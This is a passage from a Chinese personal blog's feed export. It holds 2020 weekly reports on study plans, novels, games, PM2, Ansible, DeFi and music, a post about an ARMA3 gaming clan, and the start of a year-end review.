<p>這首歌提升到探討生死的程度，就像行將就木之人，在靈魂脫離時，回頭看自己滿是皺紋蒼白的臉進行人生的回憶錄一樣，而當中的人可能是阿信自己對於生死的詰問，一問一答之間，不斷的反問自己，生死是怎麼回事，青春是什麼，既然不能擺脫輪迴（人間 瞬間 天地之間 下次我 又是誰），無法抓住已逝去的青春，那是否有對自己的人生感到後悔（無論生存或生活 我都不浪費 不讓故事這麼的後悔），最後他沒有給出答案，因為每個人在離去之前一定會有遺憾之事（有誰能聽見 我不要告別），而當中這一句（爲何人生最後會像一張紙屑 還不如一片花瓣曾經鮮豔）表達出為什麼人年老了會像紙屑、濕落葉一樣沒有價值被唾棄呢？那還不如玫瑰一樣在最鮮豔的時候落下，最後阿信把魂魄比喻成煙又代表著看的到流逝卻摸不著的時間（我坐在床前 看著指尖 已經如煙） youtube 评论</p>
</blockquote>
<h1 id="这周评价">这周评价</h1>
<h1 id="下周做什么">下周做什么</h1>
<ul>
<li>GRE 备考</li>
<li>极简欧洲史</li>
<li>Pixiv</li>
<li>Steam 挂卡</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>群星</tag>
        <tag>歌曲</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 33 周</title>
    <url>/posts/d4d246c8/</url>
    <content><![CDATA[<p>八月底了，是时候考 GRE 了。</p>
<a id="more"></a>
<h1 id="weekly-report-2020-年第-32-周-08-17-到-08-23">Weekly Report 2020 年第 32 周 （08-17 到 08-23）</h1>
<h2 id="这周做了什么">这周做了什么</h2>
<h3 id="cg">CG</h3>
<p>初步尝试了云渲染。效果还可以，但是并不能加速流体。配置渲染节点可以 <a href="https://www.inevitable.tech/posts/7a296127/">看这</a>。本来打算用 Digital Ocean，但是它风控比较严苛，注册新账号有点麻烦。</p>
<p>我想做了一个流体的字体动画。流体在字体中流体，逐渐充满整个字体。也想做一个 <a href="https://www.youtube.com/watch?v=3EfgsciQ5rM">物体掉入水中的动画</a>。就目前来看，这个动画渲染就得一两个礼拜，或者花个几十刀，使用渲染农场。</p>
<h3 id="龙族">龙族</h3>
<p>看完了三本龙族。可以感觉到前两本剧情都比较紧凑，讲的都是和主线有关的故事。到了第三部，整个篇幅长了不少，会有些啰啰嗦嗦的地方。全书中有不少伏笔，但有些伏笔直到故事的结束也没有用上。</p>
<p>第二本中董事会要求主角团寻找失去的资料。事发地点火车南站出现了两个人的身影，一个是猎人唐威，另一个人应该是夏弥。在书中并没有指出这个人是谁，只是像写伏笔一样提了以下，但后续这个伏笔没用上就是。</p>
<p>第三本中有很多很多的登场人物，虽然他们大部分都是打酱油的，对主线并没有什么贡献。看江南的随笔《龙与少年游》时，他说到有些故事的产生是由于灵感。“‘校长其实是个后背满是文身的黑道老混子。’这个概念其实是忽然出现在脑海里的，单纯就是觉得这个概念很棒，于是单独衍生出一条校长个人的日本线索来，在这条线上有上杉越，有犬山贺。” 上杉越，犬山贺有着自己的故事，但是他们的故事和主线关系并不大。江南对于这几个人物的构思并不基于主线故事，而是他觉得这个人很酷，所以他想把他写出来。“‘那美好的仗我已经打完了，应行的路我已经行尽了，当守的道我守住了。从此以后，有公义的冠冕为我留存。’我心中的上杉越因为这句话而成形。”</p>
<p>刚认识路明非的时候，他就是个弱小，懦弱的臭小孩。他一点都不给力，他没有勇气去争取更多的东西，比如诺诺，陈雯雯，社团，在叔叔婶婶家中的地位。但江南说，“路明非真的很棒，对于某些年少而热血的读者、恨其不争的读者，我得说你们再长大一点就会明白，生活不是意淫小说，没有白来的升级机会，而路明非真的很棒，他的勇敢是真勇敢，从骨头里榨出来、从灵魂中淬炼出来的勇敢，我很希望自己能有那样的勇敢。”勇敢和怂本来是对立的，但是在路明非身上共存。路明非想要勇敢，只要付出四分之一的生命。他只有那一份的生命，"路明非是个穷孩子，他很怂他很欠他很不霸气，但他从未吝啬过付出。"</p>
<p>在那个魔幻世界发生的事情或许很难映射到我们的生活中。但这个例子或许能让你们理解一点。你的朋友要离开这座城市了，你可以和他最后在一起吃一顿饭，但是现在疫情肆虐，你的家人们也反对你出门。你愿意去见他吗？</p>
<h2 id="这周评价">这周评价</h2>
<ul class="task-list">
<li><input type="checkbox" disabled="" checked="" />
提升阅读题目正确率到 80%。</li>
<li><input type="checkbox" disabled="" checked="" />
每天半个小时到一个小时的钢琴练习。</li>
<li><input type="checkbox" disabled="" />
学习完至少 3 个画画课程。</li>
<li><input type="checkbox" disabled="" checked="" />
画不同角度的几何体。</li>
<li><input type="checkbox" disabled="" checked="" />
尝试云渲染动画。</li>
</ul>
<p>完成度 80%</p>
<h2 id="下周做什么">下周做什么</h2>
<ul>
<li>GRE 备考</li>
<li>尝试这个有趣的 <a href="https://www.youtube.com/watch?v=lVIraY22xzw">剪辑</a></li>
<li>尝试这个 <a href="https://www.youtube.com/watch?v=eoSRMxMDYsk&amp;list=PL4iRNzIK4UEqqUXcG3XwD53YT5IddXmcY&amp;index=43&amp;t=288s">动画</a></li>
<li>完成一个画画课程</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>Remarkable</tag>
        <tag>投资</tag>
        <tag>插画</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 36 周</title>
    <url>/posts/1c32c9b8/</url>
    <content><![CDATA[<p>期末结束了。新学期也快要开始了。新增了这周看了什么板块。</p>
<a id="more"></a>
<h1 id="这周做了什么">这周做了什么</h1>
<h2 id="pm2">PM2</h2>
<p><a href="https://pm2.keymetrics.io/">PM2</a> 是用来管理，监控 Node.js 服务和进程的，当然它也支持监控 bash 程序。</p>
<p>在这之前我们使用<code>node app.js</code>来启动一个 Node.js 服务。如果想要保证这个服务在 SSH 窗口退出后保持运行，我们需要将其放在 Screen 或者 Tmux 中。</p>
<p>有了 PM2 后，执行<code>pm2 app.js</code>就可以启动 Node.js 程序了。退出 ssh 窗口也不会中止<code>app.js</code>。PM2 还提供了查看<code>app.js</code>的日志，重启，中止程序的功能。我们也可执行<code>pm2 plus</code>以登录 PM2 账号，这样就可以在 PM 官网的仪表盘上管理和监控我们的服务。</p>
<p>如果想要传入参数，可以执行以下命令。<code>pm2 start app.js --name my-api -- --port 4000</code>。这样就传入了<code>port</code>参数给 Node，并且将<code>app.js</code>这个进程命名为 my-api。</p>
<h2 id="steam-挂卡卖卡">Steam 挂卡&amp;卖卡</h2>
<p>Steam 挂卡通过使用 Steam 机器人 24 小时不间断玩游戏来获取集换卡片。卖卡就是将这些集换卡片在市场卖出。如果用 Steam 令牌添加了新设备，集换卡片七天内不能交易。</p>
<p><a href="https://github.com/JustArchiNET/ArchiSteamFarm">ASF</a> 是比较热门的挂卡程序。我们可以选择在本地挂卡或者在 VPS 上进行挂卡。本地不可能 24 小时开机，所以我选择在 VPS 上进行挂卡。<a href="https://www.eaglemoe.com/archives/177">教程 1</a>，<a href="https://moe.best/yoimono/asf-see.html">教程 2</a>。</p>
<p>在教程 1 当中，作者将 ASF 程序放在另一个 Screen 中运行。像上一节描述的那样，我么可以用 PM2 来达到更好的效果。<code>pm2 ./ArchiSteamFarm</code>。</p>
<h2 id="pixiv">Pixiv</h2>
<p>写了一个脚本把点赞的图收集起来，每周都可以回顾一下过去一周点赞的图，好好的欣赏，评价一下。至于怎么评价可以看<a href="https://www.youtube.com/watch?v=gAie0aa0e-4">怎么判断画的是神作，还是被无脑吹捧的狗屎</a>。由于点赞列表数据里不含时间，所以就增量更新。以前下载到哪里，我们就把在那之后的点赞的图下载一遍。图片相关信息就直接写进图片元数据中，这样移动起来比较方便。</p>
<p>图片元数据的格式分为 EXIF，IPTC，XMP 这几种格式。每一种格式有着自己的数据规范。比如 EXIF 是没有 Title 这一栏的，但是 XMP 却有。对比了他们所提供的格式和我自己所获取的图片数据，我选择 XMP。</p>
<p>虽然将所有图片信息写入元数据方便图片的移动，但我比较担心读取和写入数据时的性能开销。如果影响不大，这个方法比把数据单独写入数据库要简洁很多。即便图片改了名字，元数据也不会丢。</p>
<p>这个 <a href="https://www.thexifer.net">工具</a> 可以在线查看元数据。</p>
<h2 id="star-renegade">Star Renegade</h2>
<p><a href="https://store.steampowered.com/app/651670/Star_Renegades/">像素风，回合制，Roguelike，RPG 游戏</a>。虽然是像素风格，光影却是正常的。打击特效和音效做的不错，但是看上那么多遍还是会疲劳。</p>
<p>作为一个 Roguelike 游戏，随机的成分并不是特别多，地图虽然是随机，但是 Boss 和资源变化并不大。在每次旅途中会有装备，等级，和队友互相之间的好感系统。这个养成系统感觉是很 RPG 的。但这个 RPG 是在 Roguelike 的框架下，也就是每次死亡，装备，等级，好感都会重置，需要重新获取。由于回合制的节奏，以及 RPG 的机制，每一把的时间都特别长，大概在三个小时左右，这还是打到一大半的位置。</p>
<p>地图与其他简洁明了的 Roguelike 不同，这款游戏并没有地图，取而代之的是 2D RPG 游戏的那种设计。玩家可以在区域内走来走去。整个大区域被划分成更加细小的区划，通过限制玩家进入新的区划的次数来限制玩家的行动点。整个大区域的设计更像是图，而不是 Slay the Spire 那样的树。Star Renegade 通过这种方式更好的展示了游戏的美术设定，玩家也可以与区域中的一些物品进行互动，从而触发一些关于背景文化的对话。这样的坏处就是玩家不容易看清图的结构，游戏的节奏也会被拉慢，因为玩家在游戏战斗之间需要探索。</p>
<p>游戏中独特的扎营机制也放缓了游戏节奏。消耗完三个行动点，玩家就需要扎营，等待新的一天。在扎营期间，玩家可以培养人物之间的好感，使用各种 Buff 的卡片。</p>
<p>相比 Slay the Spire，选择节点，打怪，选择节点，打怪，这款游戏的节奏慢了很多。打一把需要更长的时间。那么每一把之后，玩家会变强从而在下一次走的更远吗？我个人觉得不怎么会。每一把之后的结算所能获取的东西并不多，我至今还卡在第三关。每一次花费两三个小时来到第三关，然后死亡，然后重来，最后放弃。我想这是游戏节奏的问题，又或者是去掉 Roguelike 可以解决的问题。</p>
<h2 id="ansible">Ansible</h2>
<p><a href="https://www.ansible.com/">Ansible</a> 是一个来自 Red Hat 的运维工具。它可以自动化，批量进行许多操作。它适合用来在<strong>已有的服务器</strong>上安装和管理软件。</p>
<p>我日常会用到 VPS，并在上面安装或者管理软件。常用的软件也就那几个。那么我们可以把这几个软件的安装和管理写成 Ansible Playbook。以后我们就不再需要重复安装和管理软件的步骤，只需要执行 Playbook 就可以了。用自动化解放了我们的双手。</p>
<p>Ansible 的 Playbook 编写采用渐进式，用户需要写下每一步需要做什么。Ansible 有丰富的 Role（库，插件，比如 <a href="https://github.com/geerlingguy/ansible-role-nodejs">安装 Node.js</a>），组件支持，大部分操作都可以用现成的 Role 或者组件实现，不需要自己额外进行编写。</p>
<p>Ansible 没有 Master 的概念，任何一个节点都可以推送命令。Ansible 通过 SSH 连接上节点后，执行对应的命令。由于采用 SSH 进行命令推送，接受命令推送的节点不需要安装 Ansible 客户端。</p>
<p>因此对于我来说最好的实践便是在本地安装好 Ansible，注意它不支持 Windows。将常用的软件配置写成 Ansible Playbook。介于丰富的组件和 Role，这并不难。每当有新的 VPS 时，我们执行相应的 Ansible Playbook 就可以完成所有工作。比如我写了 Tiny Tiny Rss，Unblock Netease Music 的 Playbook，如果以后更换 VPS 就可以很方便的安装这些软件。</p>
<p>我们可以把用到的 Role 放到 Requirement.yml 中，这可以保证换个环境，安装完依赖后，我们之前写的 Playbook 还可以正常运行。</p>
<p>最后推荐一个 <a href="https://www.youtube.com/watch?v=5hycyr-8EKs">视频教程</a>，视频教程虽然看起来慢但是比较容易理解使用者的思路，易于模仿。</p>
<h1 id="这周看了什么">这周看了什么</h1>
<ul>
<li><a href="http://music.163.com/song?id=1449678888&amp;userid=92955555">回到夏天</a>: 作曲：爱写歌的小田，作词：雷壮、爱写歌的小田，编曲：罗洋（卡其漠）。然而这个旋律从头到尾就没怎么变过。</li>
<li><a href="https://github.com/Mikubill/transfer">Trasfer</a>: 这个工具整合了所有主流的文件分享工具，比如 airpotal，奶牛快传等。文件的分享和下载可以通过<strong>命令行</strong>完成。传输方法不是点对点，因此借助第三方服务器需要消耗更多的时间。如果想要点对点，节省时间的传输方式可以用 <a href="https://winscp.net/eng/index.php">WinSCP</a> 等软件采用 SFTP 的传输方式。</li>
<li><a href="https://blog.spencerwoo.com/2019/11/batch-git-pull/">Batch Git Pull</a>: 批量更新 Git 仓库。我想很少有人一次性更新所有仓库吧。对于那些不怎么维护的 Git 仓库，更新了之后只会徒增 bug。那些正在维护的仓库，应该会一个个的更新，慢慢解决 Bug。</li>
<li><a href="https://www.tabnine.com/">Tabnine</a>: 非常好用的 AI 自动补全。当别人只能一个词一个词补全的时候，它可以补全整句话。连<code>for</code>语句也可以帮你补全，list 的 index 也可以帮我补全。</li>
<li><a href="https://github.com/eugeneyan/applied-ml">Applied ML</a>: 大公司发的人工智能文章。</li>
<li><a href="https://www.heropatterns.com/">Hero Pattern</a>: 可以自定义的 SVG 几何背景图。</li>
<li><a href="https://github.com/alirezamika/autoscraper">autoscrapper</a>: 一个智能的爬虫库。用户将目标告诉它，这个库会返回类似的结果。比如要抓取一个博客中所有文章的标题，用户可以将一个文章的标题告诉它，它便输出所有标题。</li>
<li><a href="https://www.youtube.com/watch?v=gAie0aa0e-4">怎么判断画的是神作，还是被无脑吹捧的狗屎</a>: 这个视频讲述了作者自己如何判断一幅画好看不好看。
<ul>
<li>艺术元素：
<ul>
<li>线条</li>
<li>明暗和颜色</li>
<li>主体形状</li>
<li>材质</li>
<li>空间</li>
</ul></li>
<li>艺术原理：
<ul>
<li>平衡</li>
<li>引导线（视线运动）</li>
<li>对比
<ul>
<li>颜色明暗</li>
<li>颜色冷暖</li>
<li>颜色饱和</li>
</ul></li>
<li>风格统一</li>
<li>规则变化（不重复和呆板）
<ul>
<li>软的线条和硬的线条组合</li>
<li>直和弯的组合</li>
</ul></li>
</ul></li>
<li>数据指标：
<ul>
<li>初次观看时长</li>
<li>重复观看次数</li>
<li>观看后的思考</li>
</ul></li>
</ul></li>
<li><a href="https://www.morganstanley.com/ideas/thoughts-on-the-market">Thoughts on the market</a>: Morgan Stanley 对于市场的分析。</li>
<li><a href="https://www.myfonts.com/WhatTheFont/">MyFonts</a>: 识别图片中的字体。</li>
<li>《乔布斯传》作者沃尔特，艾萨克森：“一个具有强烈个性的人身上集合了人文和科学的天赋后所产生的创造力，是在 21 世纪建立创新型经济的关键因素。”</li>
</ul>
<h1 id="下周做什么">下周做什么</h1>
<ul>
<li>GRE 备考</li>
<li>极简欧洲史</li>
<li>Pixiv 完善</li>
<li>图片展示网站 UI 设计</li>
<li>整理手机浏览器标签页</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>Pixiv</tag>
        <tag>Star Renegade</tag>
        <tag>Pm2</tag>
        <tag>Steam</tag>
        <tag>Transfer</tag>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 40 周</title>
    <url>/posts/8e770ca0/</url>
    <content><![CDATA[<p>开学了！</p>
<a id="more"></a>
<h1 id="这周做了什么">这周做了什么</h1>
<h2 id="塞尔达传说">塞尔达传说</h2>
<p>塞尔达传说被奉为开放游戏世界的标杆。作为一个游戏爱好者当然不能错过这款游戏，即使我没有Switch也不行。<a href="https://cemu.info/">Cemu</a>给了我在PC上玩塞尔达的机会。它并不是Switch模拟器，而是任天堂的Wiiu模拟器。还有人为其开发了光追插件，塞尔达 RTX ON！具体的安装教程可以参考<a href="https://www.inevitable.tech/posts/b2365e06/">上一篇文章</a>。</p>
<h2 id="图片展示网站">图片展示网站</h2>
<p>完成了UI设计，采用了深色背景，图片更有辨识度。很多图片网站都采用了一个网页尽量展示多的图片，比如pixiv，dribbble，点击图片可以进行放大。这种方式有利于展示大量图片，但是不利于用户仔细的观察这些图片。因此我尽可能放更大的图片，给予用户有沉浸感，和更多的图片细节。</p>
<p>对于文章，我们一般会在主页提供摘要来帮助用户快速了解文章的主要内容。那怎么给图片提供摘要呢？<a href="https://github.com/yyyeying/FilmToLongPicture">这个项目</a>给了我启发。我们可以将所有图片按照某种顺序融合成一张题图。只看题图，我们可以对这些图片的色调有大致的了解。</p>
<h2 id="defi">DEFI</h2>
<p>最近大火的DEFI我也参与了一脚。DEFI是Decentralized Finance的缩写，意思为去中心化交易所。整个交易所由智能合约构成，运行在区块链上。交易所的流动资金由用户提供，提供流动资金的用户会获得奖励，一般为交易手续费加上代币奖励。不同DEFI项目区别在于他们的做市商算法，即如何撮合用户的交易。基本所有算法做市商都存在无常损失，即你放进去多少钱提供流动性，拿出来的时候钱只会变少，不会变多。</p>
<p>怎么看为这些项目提供流动性几乎是稳赚不赔。为相对稳定的交易对提供流动性可以降低无常损失。剩下的只要选择收益高的项目就行了。往往项目初期的时候收益较高。在初期，参与的人较少，有更多的激励。总之会不会暴富这说不好，但是手续费是真的贵。以太坊一次转账就是10刀。流动性挖矿似乎钱越多越划算。</p>
<p>除了自己寻找项目，不少传统交易所都推出了流动性挖矿的项目，利率高的惊人。传统交易所整合用户资金，选择合适的项目，进行更高效的流动性挖矿。</p>
<p>从总锁仓价值来看，Defi的快速增长已经过去，目前总锁仓价值在13B左右浮动，已经不在快速增长，甚至出现小幅下滑。</p>
<h2 id="极简欧洲史">极简欧洲史</h2>
<p>这本书用的语言比较随意，读起来也比较轻松。书中从宗教，日耳曼人，罗马这几条线讨论了欧洲中世纪到近代的发展。书中有一些点让我记忆深刻。</p>
<p>中国很早就采用了中央集权，很难理解欧洲到了中世纪还是封建制度。作为国王天天得和自己的强力封臣扯皮，而且国王还打不过这些强力封臣。钱，税收，兵力都得依仗这些封臣。封臣对君主的效忠极大成功依靠契约，而不是利益之类的。随着欧洲各国的摩擦日益加剧，君主们找到了扩充军力的借口。至于这些庞大的军队是为了保家卫国，还是对内打压不听话的封臣就看君主的想法了。在这些扩军的国家中，最神奇的便是英国。英国作为岛国，海军是它与其他国家作战的主力。可是这海军可不能用来打自己的封臣，要打自己的封臣得靠陆军。因此英国的君权仍旧极大的受限于封臣。</p>
<p>统治阶级是如何看待中产阶级呢？统治阶级认为中产阶级的生活依赖于城市，而不是这些统治者。即换了个统治者，中产阶级仍旧那样的活着。 &gt; 这些欧洲君王降伏旧日贵族后,随即成为一个活跃的 新兴阶级一一城市里的中产阶级的支持者。当年这些君主势单力簿,曾经允许各个城镇自治,而随着城市的财富日增,这个让步也变得更加举足轻重。相较于自拥大军、躲在城堡里防御自己的贵族,中产阶级似乎平和得多,不具威胁性。然而,无论贵族多难应付,他们毕竟是社会秩序的一部分,而在这个社会秩序里,国王是天经地义的元首;反观中产阶级,他们的生活方式根本无需国王的存在。长远来看,对于王政的威胁远比贵族更棘手。 # 这周看了什么 * <a href="https://keycombiner.com/">Key Combiner</a>：这个网站可以帮助我们学习和记忆快捷键。网站提供了常用软件的快捷键。 * <a href="https://www.coingecko.com/en">Coin Gecko</a>：查看和追踪加密货币价格。 * <a href="https://www.macrotrends.net/">Macro Trends</a>: 提供不同宏观经济指标的走势图。可以查看不同的股票指数，按照行业，市值排序查看股票。 * <a href="https://zapper.fi/dashboard">Zapper.fi</a>：提供钱包的Defi资产分析，提供一键式流动性挖矿。界面美观。 * <a href="https://debank.com/">DeBank</a>：同上，但是提供更多的Defi分析，比如锁仓价值，流动挖矿利率。 * <a href="https://github.com/microsoft/playwright-python">Playwright for Python</a>：微软出品的Python端到端自动化框架，有点像<a href="https://developers.google.com/web/tools/puppeteer">Puppeteer</a></p>
<h2 id="歌曲">歌曲</h2>
<h3 id="octopath-traveller-ost">Octopath Traveller OST</h3>
<p><a href="http://music.163.com/album?id=71747233&amp;userid=92955555">《八方旅人》原声带</a>，作者为西木康智。很难想象这么优美有古典风格的曲子是仅仅30岁的西木康智制作的。非常期待他以后的作品。<a href="https://www.youtube.com/watch?v=bPPqMnf91VY&amp;t=148s">8-bit Music Theory</a>对西木康智在曲子中大量运用转调进行了分析。我乐理差，这个分析也听得一知半解的。</p>
<h3 id="山居秋暝">山居秋暝</h3>
<p><a href="http://music.163.com/song?id=1439379112&amp;userid=92955555">活泼的嗓音唱出王维的《山居秋暝》。</a>用流行音乐重新诠释古诗给我带来了不同的感觉，不同于中学时代背诵古诗的感觉。这种音律让古诗更加动听，我也更愿意去听。除了这首《<a href="http://music.163.com/song?id=1439379112&amp;userid=92955555">山居秋暝</a>》，<a href="http://music.163.com/song?id=1375935067&amp;userid=92955555">《杨花落尽子规啼》</a>也是我很喜欢的一首，它并不是那种活泼的感觉。</p>
<h1 id="这周评价">这周评价</h1>
<p>其实这些事情来自最近一个月。自从夏校结束，假期开始我就开始躺，自然也就什么计划，写不出周报。不得不说开学了以后，做事的效率突然飙升。就像电脑从关机状态变成开机运行一样。娱乐的时间减少了倒是真真确确的减少了。我们真的需要那么多娱乐时间吗？假期的时候陪女朋友看了沉默的真相。这属于那种看了开头就知道是什么味道的片子。这部片子的主题是司法公正，官商勾结。这些也算是老生长谈了。这电视剧我不怎么喜欢，总感觉节奏拖沓。有点类似玩手游的感觉。手游厂商跟玩家反着干，给玩家设置诸多限制，不让玩家轻易的拿到他们想要的，比如体力限制，升级需要大量的素材。电视剧为了让观众不那么快的了解到真相，谜底，叙事弯弯绕绕，给线索跟挤牙膏一样。电视剧的叙事手法有点东野圭吾的感觉，寻找案件背后的故事。</p>
<h1 id="下周做什么">下周做什么</h1>
<ul>
<li>读一章Designing Data-Intensive Applications</li>
<li>看Array Programming with Numpy</li>
<li>尝试ActionsFlow</li>
<li>尝试网格交易</li>
<li>使用Trafik</li>
<li>使用Portainer</li>
<li>使用Huginn</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>塞尔达传说</tag>
        <tag>Cemu</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 41 周</title>
    <url>/posts/b3172510/</url>
    <content><![CDATA[<p>确定了这个学期的选课。</p>
<a id="more"></a>
<h1 id="这周做了什么">这周做了什么</h1>
<h2 id="vps-设置">VPS 设置</h2>
<p>把 VPS 给设置好了。其中最花时间的是网络的配置，反向代理的配置。这些部分出错了很难找到原因，需要不断的去更改配置找到正确的方法。</p>
<p>我本来以为 VPS 价格翻倍性能也翻倍，其实并不是。$5 的 VPS 是 1G1C。$10 的 VPS 是 2G1C。价格翻倍了，但是 CPU 数量没变。但是从$20 到开始，基本就是价格翻倍，性能翻倍了。</p>
<p>关于具体在 VPS 上安装了那些软件，怎么进行维护可以看 <a href="https://www.inevitable.tech/posts/693c10/">这一篇文章</a>。</p>
<h1 id="这周看了什么">这周看了什么</h1>
<ul>
<li><a href="https://www.nature.com/articles/s41586-020-2649-2">Array programming with NumPy</a>：这篇文章展示了 Numpy Array Computation 的火爆以及先进。大致感觉就是 Numpy 自己吹自己一波。Numpy 觉得未来的挑战将会是面临更多的用户以及为不同的专业计算平台做适配，比如 FPGA，TPU 等等。</li>
<li><a href="https://github.com/nginx-proxy/nginx-proxy">Nginx-proxy</a>：方便快捷的为运行在 Docker 中的服务做反向代理。</li>
<li><a href="https://github.com/huginn/huginn">Huginn</a>: 自动化软件，像 IFTTT。</li>
<li><a href="https://zhuanlan.zhihu.com/c_158208519">用谁都能看懂的方法解释分布式系统，大概。.</a>：一个听不错的分布式系统专栏。</li>
<li><a href="https://zhuanlan.zhihu.com/c_212000558">一个书魔程序员的读书简评</a>：同上。</li>
<li><a href="https://rsms.me/">rsms</a>: 一个设计师的个人网站。颜色的运用很棒。</li>
<li><blockquote>
<p>一本书：Designing Data-Intensive Applications， 对应程序员 3 能力中的工具箱深度广度两个概念-1：多范式编程和最小表达力原则 (least expressiveness principle), 对应程序员 3 能力中的程序语言理解深度和表达抽象能力两个概念-2：领域驱动设计 (Domain Driven Design)，对应程序员 3 能力中的方法论，编程大道 (programming in the big)，和构架能力。</p>
</blockquote></li>
</ul>
<h2 id="歌曲">歌曲</h2>
<h3 id="oskar-roman-jezior">Oskar Roman Jezior</h3>
<p><a href="https://space.bilibili.com/566258416/">Oskar Roman Jezior</a> 是一位德国的钢琴家。他弹奏了很多华语流行歌曲，比如《时间煮雨》，《不为谁而作的歌》，《十年》，《说好不哭》。他的弹奏富有感情，轻重缓急的对比非常明显。</p>
<h1 id="这周评价">这周评价</h1>
<p>除了网格交易，上周要做的都做了。 Designing Data-Intensive Applications 目前进度：1/12</p>
<h1 id="下周做什么">下周做什么</h1>
<ul>
<li>读一章 Designing Data-Intensive Applications</li>
<li>自动抓取 Twitter 上喜爱的图片保存到本地</li>
<li>网格交易</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMA3-2e.R.E.P</title>
    <url>/posts/1a68c1d5/</url>
    <content><![CDATA[<p>ARMA3 算是我接触的第一个大型团队协作游戏。 <a id="more"></a></p>
<p>Arma3是一款军事沙盒模拟游戏，主要以步兵作战为主。单人打arma3异常的困难，但是多人联机，难度和乐趣就变得不一样了。</p>
<p>2e.R.E.P是我加入的arma3战队，法外第二伞兵团，主要以模拟伞兵作战为主（虽然我们每次进入战场的方式都不一定是跳伞）。</p>
<p>这是我第一次参加游戏组织，和一群有相同游戏爱好的人一起打游戏，感觉还是挺不错的。出任务时，大家互帮互助，互相依靠。不出任务时，qq群里灌灌水，讨论一些军事知识。可以说这个团队符合了我的预期。</p>
<p>2e.R.E.P对于新兵还是挺友好的。教官们会给予新兵应有的训练，之后不定期还有集训，来提升作战意识以及技巧。记得我加入2e.R.E.P的前几个礼拜，感觉压力还是挺大的。每周末晚上登上游戏，参加训练的时候，就跟上晚课一样-有着一堆东西等着我去学习。前几次出任务的时候，我不熟悉队友，与队友几乎没有配合可言；整个任务下来就是在思考：我在那？我要做什么？队友在哪里？是谁在讲话（队友的声音根本辨识不清）？但是随着时间的推移，和队友配合次数越来越多，训练次数的增加，这样的紧张逐渐减少。我也能熟练的区分出队友的声音。有人的声音很贼，有人的声音沧桑，有人声音很暖，有人的声音很脆。每次任务对我来说都是一次角色扮演，与我的可靠的队友们一起消灭敌人。</p>
<p>从战队负责人身上，我也可以看到应有的激情与投入。负责人每个周末晚上的黄金时间都在线组织任务或者训练。负责人平日里也基本在线，有空的时候还要修改一下模组，地图，在群里与大家讨论一些战术问题。这样的投入真的是挺大的。我，作为一个学生，周末晚上可能也要出去吃个饭，鸽一下，又何况一个成年人呢。希望负责人能早日找到女朋友。</p>
<p>在2e.R.E.P中我是学到了不少东西的，从基本的战术素养，与队友的交流与配合，到基本武器和载具的识别以及担任小队长对领导力的培养。以前我是对军事一点都不懂的人，但是现在我可以说是半只脚跨过了门槛，可以与军宅们稍微聊两句了。而且2e.R.E.P的特色是伞降，对于伞降，索降，机降的学习与应用和伞兵的战略意义并不是军宅们都会了解的东西。</p>
<p>战队里有各式各样的人，有跟我教育背景相同的人，有比我阅历多的人，有上海市区拥有两栋别墅的人。除去arma3这个共同的爱好，大家有着不同的爱好、背景。就是这样一个有着多元化人员构成的战队，却顺利构建了属于自己的文化-淡定的氛围。面对紧急事情(例如步兵遇到了T34),第一句听的话是<code>别慌</code>。面对一件令人诧异的事情，大家会说<code>还行</code>。大家都有着奇怪的口癖<code>rua</code>。大家还有这共同的动词<code>摸</code>。这个文化以及2e.R.E.P成员这个身份，把大家凝聚在了一起。</p>
<p>在文章的最后，我真的想感谢团队的负责人-黑客。我真的很佩服他的毅力，与热情。整个团队发展的压力，几乎都又他一人承担了下来。我希望他能从中收获到他想要的东西，也希望他身上的担子能减轻一些，大家都积极地去分担一份压力，让他有更多的时间去找一个女朋友。</p>
<a href="http://chnarma32erep.sxl.cn/">战队官网</a>
<hr>
<center>
<img class="lazyload" data-src="/static/images/2erep-gift.png">
</center>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>Organization</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 这一年</title>
    <url>/posts/e12efce4/</url>
    <content><![CDATA[<p>我们走，2021。</p>
<a id="more"></a>
<h1 id="课程">课程</h1>
<p>今年一共上了 16 节课。</p>
<figure>
<img data-src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df079def-4f11-4e19-92fc-458451e08c69/download_(1).png" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df079def-4f11-4e19-92fc-458451e08c69/download_(1).png" /><figcaption aria-hidden="true">https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df079def-4f11-4e19-92fc-458451e08c69/download_(1).png</figcaption>
</figure>
<h1 id="side-project">Side project</h1>
<p>今年一共做了 13 个，大概是一个月一个。这其中有些 Project 计划是一起用的。比如 Gallery 和 Daily Picture 。Daily Picture 负责抓取图片，Gallery 负责前端显示，Image Excerpt 负责为十几张图片生成一个统一的颜色预览图。</p>
<p>👛 <a href="https://github.com/glazec/friendToken">FRIEND</a> ：这是我目前正在进行的项目。我希望可以探索一下代币化个人价值和社交价值。目前的想法是可以将个人代币的价值与你朋友的代币进行锚定。个人可以更改这个锚定价格。毕竟人都在进步，如果你进步的比你朋友快，你就应该提高代币的锚定价格。</p>
<p>那这些个人代币可以怎么使用，又有什么价值呢？目前我想到的是这些代币可以用于赞助，VIP，付费阅读，付费提问，自定义化的付费服务，等等。代币可以分发给那些支持者，比如在社交媒体上给你点赞，转发你的推文等等。</p>
<p>这是我第一次尝试智能合约开发。踏过了 Solidity，各种开发框架，本地环境搭建，Debug，Test 等等的坑。智能合约开发和 Debug 都比 Web 开发或者 Python 之类的难度高。由于智能合约更新的困难，我也写了很多 Test。Test 代码大概在合约代码的两倍左右。</p>
<p>具体的一些坑可以看我的 <a href="https://twitter.com/cruz_lyp">Twitter</a>。关于智能合约开发的推荐流程如果大家感兴趣的化可以考虑以后整理一下。</p>
